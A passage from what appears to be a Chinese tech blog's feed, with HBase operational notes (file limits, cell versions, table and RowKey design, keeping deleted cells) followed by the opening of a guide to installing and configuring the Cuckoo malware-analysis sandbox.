<p>Linux 系统默认的 <code>ulimit -n</code> 结果为 <code>1024</code> ，这个数量对 HBase 来说有点低，如果 HBase 打开的文件句柄数量超过这个限制，会报以下形式的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Exception increateBlockOutputStream java.io.EOFException</div><div class="line">2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Abandoning block blk_-6935524980745310745_1391901</div></pre></td></tr></table></figure></p>
<p>官方建议这个数值最少 <code>10000</code>，不过最好是 2 幂或可以跟 2 的幂有简单的换算关系，比如 <code>10240</code>。</p>
<a id="more"></a> 
<p>HBase 打开的文件句柄数量，和 <code>StoreFile</code> 文件的数量直接相关，而 <code>StoreFile</code> 的数量受 <code>ColumnFamily</code> 的总数和 <code>Region</code> 的数量影响。每个 <code>ColumnFamily</code> 至少要用到一个 <code>StoreFile</code>，而一个被加载的 <code>Region</code> 可能要用到 <code>6</code> 个甚至更多 <code>StoreFile</code> 文件。一个 <code>RegionServer</code> 上会打开的文件句柄数量，有个大概的计算公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(StoreFiles per ColumnFamily) x (regions per RegionServer)</div></pre></td></tr></table></figure></p>
<p><code>ulimit -u</code> 可以查看系统允许打开的进程数量，如果 HBase 启动进程过多，会抛出 <code>OutOfMemoryError</code> 异常。</p>
<hr>
<h3 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h3><p>升级过程不能跨大版本，必须从高到低依次升级。</p>
<hr>
<h3 id="索引数据"><a href="#索引数据" class="headerlink" title="索引数据"></a>索引数据</h3><p>HBase 的 <code>get</code> 功能，其实基于 <code>scan</code> 来实现，<code>scan</code> 也可以支持一些查询条件，比如下面的 Java 代码会索引出所有 <code>rowkey</code> 以 <code>0xjiayu</code> 开头的行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] CF = <span class="string">"cf"</span>.getBytes();</div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] ATTR = <span class="string">"attr"</span>.getBytes();</div><div class="line">...</div><div class="line"></div><div class="line">Table table = ...      <span class="comment">// instantiate a Table instance</span></div><div class="line"></div><div class="line">Scan scan = <span class="keyword">new</span> Scan();</div><div class="line">scan.addColumn(CF, ATTR);</div><div class="line">scan.setRowPrefixFilter(Bytes.toBytes(<span class="string">"0xjiayu"</span>));</div><div class="line">ResultScanner rs = table.getScanner(scan);</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">  <span class="keyword">for</span> (Result r = rs.next(); r != <span class="keyword">null</span>; r = rs.next()) &#123;</div><div class="line">    <span class="comment">// process result...</span></div><div class="line">  &#125;</div><div class="line">&#125; <span class="keyword">finally</span> &#123;</div><div class="line">  rs.close();  <span class="comment">// always close the ResultScanner!</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h3 id="数据记录的-version"><a href="#数据记录的-version" class="headerlink" title="数据记录的 version"></a>数据记录的 <code>version</code></h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#versions" target="_blank" rel="external">http://hbase.apache.org/book.html#versions</a></p>
</blockquote>
<p>HBase 中，一个 <code>{row, column, version}</code> 的组合精准定义一条记录（<code>cell</code>），<code>row</code> 和 <code>column</code> 字段的值都是未解析的字节串，但 <code>version</code> 是长整型数字，一般是时间戳，由 <code>java.util.Date.getTime()</code> 或 <code>System.currentTimeMillis()</code> 生成。</p>
<p><code>version</code> 字段存在的意义，是相同的 <code>{row, column}</code>，插入、修改的时间戳不同，其 <code>{row, column, version}</code>  组合也代表不同的数据记录，这些数据记录实际的数据相同，但版本不相同；把 <code>version</code> 字段用到 HBase 的数据表中，意思是让 HBase 为同一组 <code>{row, column}</code> 保留的版本数目。在 HBase 0.96 以前，一个新创建的数据表默认的 <code>version</code> 值是 <code>3</code>（即默认为同一组数据最多保存 3 个版本），自 HBase 0.96 开始，默认值改为 <code>1</code>。</p>
<p><code>version</code> 字段可以在创建数据表的时候就设定好，也可以创建数据表之后用 <code>alter</code> 的方式更改，具体需查阅官方手册。</p>
<p>HBase 中，<code>version</code> 按照降序存储，所以每次需要索引数据，最新版本的数据（时间戳表示的<code>version</code> 值最大）最先被索引。默认只索引最新版本的一条记录，如果需要索引所有版本或部分版本的数据记录，可以参考 <a href="http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/client/Get.html#setMaxVersions(" target="_blank" rel="external">http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/client/Get.html#setMaxVersions(</a>) 。</p>
<p>同一条记录（<code>cell</code>）里的 <code>version</code> 容易疑惑的两个地方：</p>
<ul>
<li>如果 <code>cell</code> 被多次连续写、修改，那么只有最后一次的操作是可以索引的、有效的；</li>
<li><code>version</code> 的值只需 <strong>非升序</strong> 即可。</li>
</ul>
<p>对数据记录的每一次 <code>put</code> 操作，都会产生一个新的 <code>version</code>，但 <code>put</code> 操作的时候，可以手动指定 <code>version</code> 的时间戳的数值（一般可以指定一个比较小的数值），即可以手动指定版本，使最新的操作不是最新的 <code>version</code>。</p>
<p>HBase 中的删除，默认都是 <strong>软删除</strong>，即只做一个删除标记，然后不能索引，只有在随后的 <code>Major Compaction</code> 中，才会真正地删除。另外，删除操作中，除非指定删除一个版本，不然会把小于等于当前版本的所有记录都标记为删除。</p>
<hr>
<h3 id="HBase-数据表相关"><a href="#HBase-数据表相关" class="headerlink" title="HBase 数据表相关"></a>HBase 数据表相关</h3><p>不支持原生的 Join 操作。</p>
<p>表设计的一些经验准则：</p>
<ul>
<li>一个 <code>region</code> 大小在 10~50GB 之间比较合适；</li>
<li>HBase 中的单条记录（<code>cell</code>），不宜超过 10MB，如果启用 <code>mob</code> 模块，不宜超过 50MB，不然可以考虑把数据放到 HDFS 中，然后在 HBase 中只存一个指针或者表明数据再 HDFS 位置的字串；</li>
<li>单个数据表的 <code>ColumnFamily</code> 数量不宜超过 3 个，设计 HBase 的数据表，尽量不要模仿关系数据库表的设计；</li>
<li>包含 1 到 2 个 <code>ColumnFamily</code> 的数据表，对应的 <code>Regoin</code> 数量在 50~100 个比较适合；</li>
<li><code>ColumnFamily</code> 的值越短越好，因为实际存储中，它会做每一个值的前缀，越短越节省存储空间；</li>
<li>如果只有一个 <code>ColumnFamily</code> 有频繁的写操作，那么它占用内存最多。分配资源的时候注意这一个写操作模型。</li>
</ul>
<hr>
<h3 id="RowKey-相关"><a href="#RowKey-相关" class="headerlink" title="RowKey 相关"></a>RowKey 相关</h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#rowkey.design" target="_blank" rel="external">http://hbase.apache.org/book.html#rowkey.design</a></p>
</blockquote>
<p>HBase 中存储数据，RowKey 是按字典序存储的，如果相似（名称、意义或功能相似）的 RowKey 设计的值有相同的字符前缀，那么它们会被会相邻存储在 HBase 中，此时RowKey 设计不当会导致 <strong>访问热区</strong> 问题。避免这个问题通常有三种策略：</p>
<ol>
<li>RowKey 加盐（ Salting ）—— 利于写入，不利于批量检索</li>
<li>单路哈希 —— 利于批量检索</li>
<li>翻转 RowKey</li>
</ol>
<p>RowKey、ColumnFamily 和 Column Qualifier 的值都要设的尽量简洁，以减少 HBase 的存储消耗（它们会在同一组数据中反复出现，比较占用存储空间）</p>
<p>HBase 底层是 <strong>列式存储</strong>，所以在操作数据的时候，列优先、行次之，所以先看 ColumnFamily 再看 RowKey —— 相同的 RowKey 可以对应不同的 ColumnFamily，不同的 ColumnFamily 可以包含同一个 RowKey。</p>
<p>对于同一个 ColumnFamily 来说，某一特定的 RowKey 是不可变的。改变 RowKey 的唯一方式是先删除再重新插入。</p>
<hr>
<h3 id="索引软删除的数据"><a href="#索引软删除的数据" class="headerlink" title="索引软删除的数据"></a>索引软删除的数据</h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#cf.keep.deleted" target="_blank" rel="external">http://hbase.apache.org/book.html#cf.keep.deleted</a></p>
</blockquote>
<p>上面说过，HBase 中的数据都是 <strong>软删除</strong>，<code>delete</code> 操作只是给特定的数据做一个删除标记，在后续的 <code>Major Compaction</code> 中才会被 <strong>硬删除</strong>。处于 <strong>软删除</strong> 状态的数据，在常规的索引方式下不会被索引到。但 HBase 提供了另外一种机制，可以通过 <strong><code>Raw Scan</code></strong> 的方式索引到 <strong>软删除</strong> 状态中的数据，并且 <code>Major Compaction</code> 也不会把相应的数据进行 <strong>硬删除</strong>（即经过<code>Major Compaction</code> 任务之后，<strong>软删除</strong> 状态的数据依然可以被索引到）。</p>
<p>可以对 <strong>ColumnFamily</strong> 指定是否要启用这种数据保存机制，启用方式有两种，一种是 HBase 的 Shell 命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hbase&gt; alter ‘t1′, NAME =&gt; ‘f1′, KEEP_DELETED_CELLS =&gt; <span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>HBase Java API 中的启用方式为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">HColumnDescriptor.setKeepDeletedCells(<span class="keyword">true</span>);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>通过实例演示 <code>KEEP_DELETED_CELLS</code>机制的效果，先看没启用这种机制时的操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">create <span class="string">'test'</span>, &#123;NAME=&gt;<span class="string">'e'</span>, VERSIONS=&gt;2147483647&#125;</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 10</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 12</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 14</div><div class="line">delete <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>,  11</div><div class="line"></div><div class="line">hbase(main):017:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div><div class="line"></div><div class="line">hbase(main):018:0&gt; flush <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0350 seconds</div><div class="line"></div><div class="line">hbase(main):019:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div><div class="line"></div><div class="line">hbase(main):020:0&gt; major_compact <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0260 seconds</div><div class="line"></div><div class="line">hbase(main):021:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div></pre></td></tr></table></figure></p>
<p>启用 <code>KEEP_DELETED_CELLS</code> 机制后的演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">hbase(main):005:0&gt; create <span class="string">'test'</span>, &#123;NAME=&gt;<span class="string">'e'</span>, VERSIONS=&gt;2147483647, KEEP_DELETED_CELLS =&gt; <span class="literal">true</span>&#125;</div><div class="line">0 row(s) <span class="keyword">in</span> 0.2160 seconds</div><div class="line"></div><div class="line">=&gt; Hbase::Table - <span class="built_in">test</span></div><div class="line">hbase(main):006:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 10</div><div class="line">0 row(s) <span class="keyword">in</span> 0.1070 seconds</div><div class="line"></div><div class="line">hbase(main):007:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 12</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0140 seconds</div><div class="line"></div><div class="line">hbase(main):008:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 14</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0160 seconds</div><div class="line"></div><div class="line">hbase(main):009:0&gt; delete <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>,  11</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0290 seconds</div><div class="line"></div><div class="line">hbase(main):010:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0550 seconds</div><div class="line"></div><div class="line">hbase(main):011:0&gt; flush <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.2780 seconds</div><div class="line"></div><div class="line">hbase(main):012:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     OLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0620 seconds</div><div class="line"></div><div class="line">hbase(main):013:0&gt; major_compact <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0530 seconds</div><div class="line"></div><div class="line">hbase(main):014:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0650 seconds</div></pre></td></tr></table></figure></p>
<p>可以发现，启用 <code>KEEP_DELETED_CELLS</code> 机制后，即使数据被 <code>delete</code> 而且手动执行 <code>major Compaction</code>，数据仍然能够被索引到。</p>
<p>那么问题就来了，启用 <code>KEEP_DELETED_CELLS</code> 机制后，被标记删除的数据，到底什么时候会被 <strong>硬删除</strong> ？按照官方说明，只有发生以下情况（之一）数据才会被 <strong>硬删除</strong>：</p>
<ol>
<li>数据生存期（TTL）到达，该 Row 的每个 Version 都会被彻底删除；</li>
<li>该 Row 的 Version 数量超过 <strong>版本数量上限</strong> （maximum number of versions）</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;同时打开的文件和进程数量限制-ulimit&quot;&gt;&lt;a href=&quot;#同时打开的文件和进程数量限制-ulimit&quot; class=&quot;headerlink&quot; title=&quot;同时打开的文件和进程数量限制 (ulimit)&quot;&gt;&lt;/a&gt;同时打开的文件和进程数量限制 (ulimit)&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;:&lt;br&gt;&lt;a href=&quot;http://hbase.apache.org/book.html#basic.prerequisites&quot;&gt;http://hbase.apache.org/book.html#basic.prerequisites&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linux 系统默认的 &lt;code&gt;ulimit -n&lt;/code&gt; 结果为 &lt;code&gt;1024&lt;/code&gt; ，这个数量对 HBase 来说有点低，如果 HBase 打开的文件句柄数量超过这个限制，会报以下形式的错误：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Exception increateBlockOutputStream java.io.EOFException&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Abandoning block blk_-6935524980745310745_1391901&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;官方建议这个数值最少 &lt;code&gt;10000&lt;/code&gt;，不过最好是 2 幂或可以跟 2 的幂有简单的换算关系，比如 &lt;code&gt;10240&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="bigdata" scheme="http://jiayu0x.com/categories/bigdata/"/>
    
    
      <category term="bigdata" scheme="http://jiayu0x.com/tags/bigdata/"/>
    
      <category term="hbase" scheme="http://jiayu0x.com/tags/hbase/"/>
    
  </entry>
  
  <entry>
    <title>Cuckoo 安装、配置详解</title>
    <link href="http://jiayu0x.com/2016/07/07/Cuckoo-install-config/"/>
    <id>http://jiayu0x.com/2016/07/07/Cuckoo-install-config/</id>
    <published>2016-07-06T16:00:00.000Z</published>
    <updated>2017-04-04T11:57:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h2><p><strong>沙盒</strong>(<strong>Sanbox</strong>) 是一种将未知、不可信的软件隔离执行的安全机制。恶意软件分析沙盒一般用来将不可信软件放在隔离环境中自动地动态执行，然后提取其运行过程中的进程行为、网络行为、文件行为等动态行为，安全研究员可以根据这些行为分析结果对恶意软件进行更深入地分析。</p>
<p>Cuckoo 是一款用 <strong>Python</strong> 编写的开源的自动化恶意软件分析系统，它的主要功能有：</p>
<ul>
<li>跟踪记录恶意软件所有的调用状况；</li>
<li>恶意软件文件行为：恶意软件执行过程中创建新文件、修改文件、删除文件、读取文件或下载文件的行为；</li>
<li>获取恶意软件的内存镜像；</li>
<li>以 PCAP 格式记录恶意软件的网络流量；</li>
<li>获取恶意软件执行过程中的屏幕截图；</li>
<li>获取执行恶意软件的客户机的完整内存镜像</li>
</ul>
<a id="more"></a>
<p>Cuckoo 可以分析的文件类型包括但不限于：</p>
<ul>
<li>Windows 可执行文件</li>
<li>DLL 文件</li>
<li>PDF 文件</li>
<li>MS Office 文件</li>
<li>URL 和 HTML 文件</li>
<li>PHP 脚本文件</li>
<li>CPL 文件</li>
<li>VB 脚本文件</li>
<li>ZIP 压缩包</li>
<li>JAR 文件</li>
<li>Python 脚本文件</li>
<li>APK 文件</li>
<li>ELF 文件</li>
</ul>
<p>Cuckoo 的架构也比较简单，在 Host 机上运行 Cuckoo 主程序，多个 Guest 机通过虚拟网络与 Host 机相连，每个 Guest 机上有一个 <strong>Cuckoo Agent</strong> 程序，用来做 Cuckoo 的监控代理，结构图如下：<br><img src="/imgs/1467691019551.png" alt="Cuckoo 架构图"></p>
<hr>
<h2 id="0x01-Host-机环境准备"><a href="#0x01-Host-机环境准备" class="headerlink" title="0x01 Host 机环境准备"></a>0x01 Host 机环境准备</h2><p>Host 机操作系统： <strong>Ubuntu14.04.01_amd64_desktop</strong>（官方推荐用 Ubuntu 最新的 LTS 版本），Python 版本 <strong>2.7.6</strong>。</p>
<p>先去 Cuckoo Sandbox 官网下载最新的发布版本（目前是 <strong><em>v2.0-RC1</em></strong>）： <a href="https://cuckoosandbox.org/" target="_blank" rel="external">https://cuckoosandbox.org/</a></p>
<p>先安装基本的依赖：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python python-pip python-dev libffi-dev libssl-dev</div></pre></td></tr></table></figure></p>
<p>如果要用 Cuckoo 自带的基于 Django 的 Web 管理系统，还要安装 MongoDB：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install mongodb</div></pre></td></tr></table></figure></p>
<p>接下来需要批量安装 Cuckoo 的 Python 依赖包，Cuckoo 主目录里有一个 <code>requirements.txt</code> 文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">alembic==0.8.0</div><div class="line">beautifulsoup4==4.4.1</div><div class="line">cffi==1.2.1</div><div class="line">chardet==2.3.0</div><div class="line">cryptography==1.0</div><div class="line">Django==1.8.4</div><div class="line">dpkt==1.8.6.2</div><div class="line">ecdsa==0.13</div><div class="line">enum34==1.0.4</div><div class="line">Flask==0.10.1</div><div class="line">HTTPReplay==0.1.5</div><div class="line">idna==2.0</div><div class="line">ipaddress==1.0.14</div><div class="line">itsdangerous==0.24</div><div class="line">Jinja2==2.8</div><div class="line">jsbeautifier==1.5.10</div><div class="line">Mako==1.0.1</div><div class="line">MarkupSafe==0.23</div><div class="line">ndg-httpsclient==0.4.0</div><div class="line">http://pefile.googlecode.com/files/pefile-1.2.10-139.tar.gz#egg=pefile</div><div class="line">pyasn1==0.1.8</div><div class="line">pycparser==2.14</div><div class="line">pymongo==3.0.3</div><div class="line">pyOpenSSL==0.15.1</div><div class="line">python-dateutil==2.4.2</div><div class="line">python-editor==0.3</div><div class="line">python-magic==0.4.6</div><div class="line">requests==2.7.0</div><div class="line">six==1.9.0</div><div class="line">SQLAlchemy==1.0.8</div><div class="line">tlslite-ng==0.6.0-alpha3</div><div class="line">wakeonlan==0.2.2</div><div class="line">Werkzeug==0.10.4</div></pre></td></tr></table></figure></p>
<p>其中的 <code>pefile</code> 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install -r requirements.txt</div></pre></td></tr></table></figure></p>
<blockquote>
<p>或者先在爬梯子的情况下手动安装 <code>pefile</code>，再把 <code>pefile</code> 这一项从 <code>requirements.txt</code>文件中剔除，然后在不翻墙的状态下批量安装其他不用翻墙的依赖包</p>
</blockquote>
<p>Host 机需要可以嗅探网络数据包，需要安装 <code>tcpdump</code> ，如果本机没有，则执行以下命令安装 <code>tcpdump</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpdump</div></pre></td></tr></table></figure></p>
<p>如果系统没启用 <code>root</code> 账户，由于 <code>tcpdump</code> 的执行需要 <code>root</code> 权限，则需要以下配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo <span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</div></pre></td></tr></table></figure></p>
<p>如果系统里没有<code>setcap</code>命令，则需要安装 <code>libpcap</code>包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install libcap2-bin</div></pre></td></tr></table></figure></p>
<p>如果需要启用内存镜像分析，需要安装 <code>volatility</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install volatility</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x02-Guest-客户机配置"><a href="#0x02-Guest-客户机配置" class="headerlink" title="0x02 Guest 客户机配置"></a>0x02 Guest 客户机配置</h2><p>根据前文的 Cuckoo 架构图，前面准备好了宿主机，下面就该准备 Guest 机器了。Guest 机是一个或多个虚拟机，官方推荐的虚拟机管理软件是 <strong><code>VirtualBox</code></strong> 。</p>
<p>先去 VBox 官网下载最新的对应系统版本的 Deb 安装包： <a href="https://www.virtualbox.org/wiki/Linux_Downloads" target="_blank" rel="external">https://www.virtualbox.org/wiki/Linux_Downloads</a></p>
<p>安装好 VBox 之后，创建新的虚拟机（推荐用 <code>Windows7</code>），需要对 Win7 客户机做一些基础配置。</p>
<h3 id="0x02-1-安装-Cuckoo-Agent"><a href="#0x02-1-安装-Cuckoo-Agent" class="headerlink" title="0x02.1 安装 Cuckoo Agent"></a>0x02.1 安装 Cuckoo Agent</h3><p>Cuckoo Agent 是一个植入客户机的 Python 脚本，通过 XMLRPC Server 的方式来跟 Host 主机通信、交换数据。这个 Python 脚本是跨平台的，可以在 Windows/Linux/OS X 上运行。所以客户机上需要安装 Python 环境，如果需要截屏功能，还要安装 <strong><code>PIL</code></strong> （Python Image Library）库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip instsall PIL</div></pre></td></tr></table></figure></p>
<p>Cuckoo Agent 在 Window 系统上的安装方法很简单，只需要将 <code>cuckoo/agent/agent.py</code> 文件拷贝到 Win7 客户机里，并启动即可。</p>
<p>但是这样的运行方式并不够完美，我们需要这个 <code>agent.py</code> 开机启动，并且不能有运行窗口，这就需要另做一些处理：</p>
<ol>
<li>把 <code>agent.py</code> 文件放到系统开机启动目录中，Win7 默认的路径是 <code>C:\Users\[USER]\AppData\Roaming\MicroSoft\Windows\Start Menu\Programs\Startup\</code>；</li>
<li>把 <code>agent.py</code> 后缀改成 <code>agent.pyw</code>，这样程序启动就不会有 GUI 窗口了。</li>
</ol>
